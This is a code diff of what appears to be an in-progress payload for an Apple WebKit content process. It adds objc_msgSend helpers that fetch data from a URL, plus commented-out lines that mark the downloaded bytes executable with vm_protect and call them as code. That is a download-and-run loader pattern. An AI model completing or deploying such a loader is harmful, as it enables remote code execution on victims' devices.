@@ -12,6 +12,10 @@
 #import <stdlib.h>
 #import <stdbool.h>
 #import <fcntl.h>
+#import <objc/runtime.h>
+#import <objc/message.h>
+#import <sys/mman.h>
+#import <arpa/inet.h>
 
 void crash(uint64_t, uint64_t, uint64_t, uint64_t, uint64_t, uint64_t, uint64_t, uint64_t);
 
@@ -45,9 +49,36 @@ void printHex(uint64_t value) {
     print(hexStr);
 }
 
+id stringWithCString(char* string) {
+    Class class = objc_getClass("NSString");
+    return class ? ((id(*)(Class, SEL, char*))objc_msgSend)(class, sel_registerName("stringWithCString:"), string) : NULL;
+}
+
+id URLWithString(id string) {
+    Class class = objc_getClass("NSURL");
+    return class ? ((id(*)(Class, SEL, id))objc_msgSend)(class, sel_registerName("URLWithString:"), string) : NULL;
+}
+
+id dataWithContentsOfURL(id url) {
+    Class class = objc_getClass("NSData");
+    return class ? ((id(*)(Class, SEL, id))objc_msgSend)(class, sel_registerName("dataWithContentsOfURL:"), url) : NULL;
+}
+
+void* dataBytes(id data) {
+    return ((void*(*)(id, SEL))objc_msgSend)(data, sel_registerName("bytes"));
+}
+
+size_t dataLength(id data) {
+    return ((size_t(*)(id, SEL))objc_msgSend)(data, sel_registerName("length"));
+}
+
+id downloadFile(char* urlString) {
+    return dataWithContentsOfURL(URLWithString(stringWithCString(urlString)));
+}
+
 int main(void) {
     sleep(5);
-
+    
     // Init logger
     char* homePath = getenv("HOME");
     char* path = combineStrings(homePath, "/Library/Caches/com.apple.WebKit.WebContent/log.txt");
@@ -64,8 +95,8 @@ int main(void) {
     
     printHex((uint64_t)dup2);
     printHex((uint64_t)write);
-
-
+    
+    
     printHex((uint64_t)printf);
     printHex((uint64_t)dup2);
     printHex((uint64_t)write);
@@ -78,6 +109,38 @@ int main(void) {
     
     write(STDOUT_FILENO, "Hello!!\n", 8);
     printHex(mach_task_self_);
+    
+    const char *cString = "Hello, World!";
+    
+    Class NSStringClass = objc_getClass("NSString");
+    SEL initWithUTF8StringSelector = sel_registerName("initWithUTF8String:");
+    SEL allocSelector = sel_registerName("alloc");
+    
+    // Allocate NSString instance
+    id nsStringInstance = ((id (*)(Class, SEL))objc_msgSend)(NSStringClass, allocSelector);
+    
+    // Initialize with C string
+    nsStringInstance = ((id (*)(id, SEL, const char *))objc_msgSend)(nsStringInstance, initWithUTF8StringSelector, cString);
+    
+    print("nsStringInstance");
+    printHex((uint64_t)nsStringInstance);
+    
+
+    id data = downloadFile("https://apple.com");
+    void* bytes = dataBytes(data);
+    size_t size = dataLength(data);
+    printHex((uint64_t)bytes);
+    printHex(size);
+//    printf("bytes: %p, size: %zu\n", bytes, size);
+    
+    
+//    typedef void (*test_func)(uint64_t, uint64_t, uint64_t, uint64_t, uint64_t, uint64_t, uint64_t, uint64_t);
+//    test_func test = bytes;
+//    test(200,200,200,200,200,200,200,200);
+    //void crash(uint64_t, uint64_t, uint64_t, uint64_t, uint64_t, uint64_t, uint64_t, uint64_t);
+    
+//    ret = vm_protect(mach_task_self_, (vm_address_t)bytes, size, 0, PROT_READ | PROT_EXEC);
+//    print(mach_error_string(ret));
     sleep(60);
     return 0;
 }
